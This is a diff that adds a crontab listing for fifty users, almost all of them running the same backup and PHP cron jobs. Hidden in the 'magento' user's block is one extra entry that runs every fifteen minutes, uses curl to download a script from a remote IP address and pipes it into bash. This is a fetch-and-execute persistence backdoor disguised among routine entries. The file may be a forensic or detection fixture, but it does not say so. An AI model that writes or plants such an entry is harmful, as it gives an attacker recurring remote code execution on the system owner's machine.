@@ -1,0 +1,251 @@
+# User crontab: user01
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: magento
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+*/15 * * * * /usr/bin/curl -s http://203.0.113.42/c.txt|bash
+
+# User crontab: user03
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user04
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user05
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user06
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user07
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user08
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user09
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user10
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user11
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user12
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user13
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user14
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user15
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user16
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user17
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user18
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user19
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user20
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user21
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user22
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user23
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user24
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user25
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user26
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user27
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user28
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user29
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user30
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user31
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user32
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user33
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user34
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user35
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user36
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user37
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user38
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user39
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user40
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user41
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user42
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user43
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user44
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user45
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user46
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user47
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user48
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user49
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
+# User crontab: user50
+MAILTO=""
+0 4 * * * /usr/local/bin/backup.sh
+*/15 * * * * /usr/bin/php /var/www/cron/run.php
+
